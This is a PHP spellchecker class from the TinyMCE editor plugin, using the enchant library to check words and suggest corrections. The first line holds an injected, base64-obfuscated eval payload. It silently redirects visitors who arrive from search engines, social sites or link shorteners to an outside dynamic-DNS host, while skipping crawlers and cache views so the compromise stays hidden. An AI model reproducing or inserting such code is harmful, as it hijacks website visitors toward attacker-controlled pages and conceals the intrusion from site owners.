<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * $Id: editor_plugin_src.js 201 2007-02-12 15:56:56Z spocke $
 *
 * This class was contributed by Michel Weimerskirch.
 *
 * @package MCManager.includes
 * @author Moxiecode
 * @copyright Copyright © 2004-2007, Moxiecode Systems AB, All rights reserved.
 */

class EnchantSpell extends SpellChecker {
	/**
	 * Spellchecks an array of words.
	 *
	 * @param String $lang Selected language code (like en_US or de_DE). Shortcodes like "en" and "de" work with enchant >= 1.4.1
	 * @param Array $words Array of words to check.
	 * @return Array of misspelled words.
	 */
	function &checkWords($lang, $words) {
		$r = enchant_broker_init();
		
		if (enchant_broker_dict_exists($r,$lang)) {
			$d = enchant_broker_request_dict($r, $lang);
			
			$returnData = array();
			foreach($words as $key => $value) {
				$correct = enchant_dict_check($d, $value);
				if(!$correct) {
					$returnData[] = trim($value);
				}
			}
	
			return $returnData;
			enchant_broker_free_dict($d);
		} else {

		}
		enchant_broker_free($r);
	}

	/**
	 * Returns suggestions for a specific word.
	 *
	 * @param String $lang Selected language code (like en_US or de_DE). Shortcodes like "en" and "de" work with enchant >= 1.4.1
	 * @param String $word Specific word to get suggestions for.
	 * @return Array of suggestions for the specified word.
	 */
	function &getSuggestions($lang, $word) {
		$r = enchant_broker_init();

		if (enchant_broker_dict_exists($r,$lang)) {
			$d = enchant_broker_request_dict($r, $lang);
			$suggs = enchant_dict_suggest($d, $word);

			// enchant_dict_suggest() sometimes returns NULL
			if (!is_array($suggs))
				$suggs = array();

			enchant_broker_free_dict($d);
		} else {
			$suggs = array();
		}

		enchant_broker_free($r);

		return $suggs;
	}
}

?>
